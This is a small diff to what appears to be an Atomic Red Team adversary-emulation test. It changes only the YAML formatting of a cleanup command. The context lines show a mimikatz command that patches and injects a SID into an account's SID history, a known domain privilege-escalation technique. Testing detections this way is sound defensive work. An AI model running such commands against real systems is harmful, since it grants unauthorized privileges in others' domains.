@@ -41,5 +41,5 @@ atomic_tests:
     elevation_required: true
     command: |
       #{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
-    cleanup_command: |
+    cleanup_command: |-
       #{mimikatz_path} "sid::clear /sam:#{sam_account_name}" "exit"
